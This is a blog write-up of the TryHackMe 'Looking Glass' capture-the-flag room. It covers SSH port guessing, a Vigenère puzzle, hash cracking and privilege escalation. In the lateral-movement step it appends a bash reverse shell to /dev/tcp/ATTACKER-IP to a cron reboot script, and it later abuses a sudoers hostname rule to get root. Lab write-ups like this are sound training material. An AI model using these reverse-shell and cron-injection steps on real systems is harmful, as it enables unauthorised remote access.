<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: Looking Glass THM Write-Up</title>

    <meta property="og:title" content="Dawnless | Looking Glass THM Write-Up">
    <meta property="og:image" content="http://dawnl3ss.me/assets/img/ogimage.jpg">
    <meta property="og:description" content="Looking Glass TryHackMe Write-Up by Dawnl3ss. SSH binary search + Vigenère cipher + cron reboot privesc chain.">
    <meta name="author" content="Dawnless">

    <link rel="icon" href="/public/img/icon.jpg" type="image/png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#latmov" class="nav-link">Lat Mov</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>Looking Glass</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://tryhackme-images.s3.amazonaws.com/room-icons/56215a135c08963843afda2240c317a3.png"
                alt="Looking Glass THM"
            >
            <div class="writeup-meta">
                <h1>THM - <span>Looking Glass</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-medium"><i class="mdi mdi-circle-slice-4"></i> Medium</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> TryHackMe</span>
                </div>
                <div class="tag-list">
                    <span class="tag">wonderland</span>
                    <span class="tag">ctf</span>
                    <span class="tag">alice</span>
                    <span class="tag">ssh</span>
                    <span class="tag">vigenere</span>
                    <span class="tag">cron</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Gaining Access</a></li>
                <li><a href="#latmov"><i class="mdi mdi-swap-horizontal"></i> Lateral Movement</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://tryhackme.com/room/lookingglass" target="_blank">Looking Glass</a> is a free room on TryHackMe.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">Looking Glass</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#ffbd2e">Medium</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>After adding the machine to <code class="inline">/etc/hosts</code>, NMAP reveals a huge number of open SSH ports. Connecting to random ones returns cryptic hints:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">SSH port binary search</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">$</span> <span class="cmd">ssh looking.thm -p 12000</span>
<span class="output"><span class="warning">lower</span></span>

<span class="prompt">$</span> <span class="cmd">ssh looking.thm -p 13000</span>
<span class="output"><span class="warning">higher</span></span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-mirror"></i>
                <p>
                    The room hint says <em>"What does a mirror do?"</em> - it reverses everything.
                    The responses are therefore inverted: <strong>lower</strong> means the target port is actually higher than 12000,
                    and <strong>higher</strong> means it's lower than 13000. Binary searching between 12000 and 13000 leads to the real port.
                </p>
            </div>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Gaining Access</h2>
                </div>
            </div>

            <p>Once the correct port is found, the SSH connection presents a Vigenère-encrypted Jabberwocky poem and asks for a secret code:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">SSH - correct port</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">$</span> <span class="cmd">ssh looking.thm -p 12538</span>
<span class="output">You've found the real service.
Solve the challenge to get access to the box

Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
[...]
Jdbr tivtmi pw sxderpIoeKeudmgdstd

Enter the secret code :</span></pre>
            </div>

            <p>
                I used <a href="https://www.boxentriq.com/code-breaking/vigenere-cipher" target="_blank">boxentriq.com</a> to auto-solve the Vigenère key
                (Max Key Length set to 20), then decrypted the full poem with <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>.
                The secret code appears at the bottom of the decrypted text.
            </p>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/looking-glass/vigenere_crack.png" alt="Boxentriq Vigenère auto-solve">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// boxentriq.com - Vigenère auto-solve</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/looking-glass/cracked_key.png" alt="Cracked Vigenère key">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Key found - used to decrypt the poem in CyberChef</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">secret code -> credentials</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="output">Enter the secret code :</span> <span class="cmd">[REDACTED]</span>
<span class="success">jabberwock:[REDACTED]</span>

<span class="prompt">$</span> <span class="cmd">ssh jabberwock@looking.thm</span>
<span class="output">jabberwock@looking.thm's password:
<span class="success">jabberwock@looking-glass:~$</span></span></pre>
            </div>
        </section>

        <section class="wt-section" id="latmov">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-swap-horizontal"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Lateral Movement</h2>
                </div>
            </div>

            <p>The user flag in the home folder is reversed - everything is upside down here:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">user flag - reversed</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="output">jabberwock@looking-glass:~$</span> <span class="cmd">cat user.txt</span>
<span class="output"><span class="warning">}DETCADER{mht</span></span>
<span class="output">jabberwock@looking-glass:~$</span> <span class="cmd">python3 -c 'print("}DETCADER{mht"[::-1])'</span>
<span class="success">thm{REDACTED}</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-flag"></i>
                <p><strong>User flag captured!</strong> Now let's escalate.</p>
            </div>

            <p>Checking the crontab reveals a script triggered on reboot, running as <code class="inline">tweedledum</code>:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">/etc/crontab</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="output">jabberwock@looking-glass:~$</span> <span class="cmd">cat /etc/crontab</span>
<span class="output"><span class="success">@reboot tweedledum bash /home/jabberwock/twasBrillig.sh</span></span></pre>
            </div>

            <p>Jabberwock can sudo reboot. I injected a reverse shell into <code class="inline">twasBrillig.sh</code> and rebooted:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">inject reverse shell + reboot</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="output">jabberwock@looking-glass:~$</span> <span class="cmd">echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' >> twasBrillig.sh</span>
<span class="output">jabberwock@looking-glass:~$</span> <span class="cmd">sudo /sbin/reboot</span>
<span class="output">Connection to looking.thm closed by remote host.</span>

<span class="prompt">$</span> <span class="cmd">nc -lnvp 4444</span>
<span class="output">connect to [ATTACKER-IP] from (UNKNOWN) [10.10.65.227] 43620
$</span> <span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
<span class="success">tweedledum@looking-glass:~$</span></pre>
            </div>

            <p>As <code class="inline">tweedledum</code>, I found <code class="inline">humptydumpty.txt</code> containing SHA256 hashes. Cracking them with John forms a sentence; the last line is a hex-encoded string that decodes to <em>"the password is [REDACTED]"</em>.</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">su humptydumpty -> alice SSH key</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="output">tweedledum@looking-glass:~$</span> <span class="cmd">su humptydumpty</span>
<span class="output">Password:
<span class="success">humptydumpty@looking-glass:~$</span>

humptydumpty@looking-glass:/home/alice/.ssh$</span> <span class="cmd">cat id_rsa</span>
<span class="output"><span class="success">-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
[...]
-----END RSA PRIVATE KEY-----</span></span>

<span class="prompt">$</span> <span class="cmd">chmod 400 id_rsa && ssh alice@looking.thm -i id_rsa</span>
<span class="success">alice@looking-glass:~$</span></pre>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">05 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>Alice has no sudo password, but the sudoers directory reveals something unusual:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">/etc/sudoers.d/alice</span>
                    <button class="tb-copy" data-target="cmd8">copy</button>
                </div>
                <pre id="cmd8"><span class="output">alice@looking-glass:/etc/sudoers.d$</span> <span class="cmd">cat alice</span>
<span class="output"><span class="success">alice ssalg-gnikool = (root) NOPASSWD: /bin/bash</span></span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-lightbulb-outline"></i>
                <p><code class="inline">ssalg-gnikool</code> is <strong>looking-glass</strong> reversed - the mirror theme strikes again. The <code class="inline">-h</code> flag lets sudo use a custom hostname without resolving it.</p>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sudo -h ssalg-gnikool -> root</span>
                    <button class="tb-copy" data-target="cmd9">copy</button>
                </div>
                <pre id="cmd9"><span class="output">alice@looking-glass:/etc/sudoers.d$</span> <span class="cmd">sudo -h ssalg-gnikool /bin/bash</span>
<span class="output">sudo: unable to resolve host ssalg-gnikool
<span class="success">root@looking-glass:/etc/sudoers.d#</span>

root@looking-glass:~#</span> <span class="cmd">python3 -c 'print("}DETCADER{mht"[::-1])'</span>
<span class="success">thm{REDACTED}</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Root flag captured!</strong> Box fully pwned via SSH binary search -> Vigenère crack -> cron reboot shell -> hash cracking -> alice SSH key -> reversed sudoers hostname. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>

<script src="/public/js/wtpage.js"></script>
</body>
</html>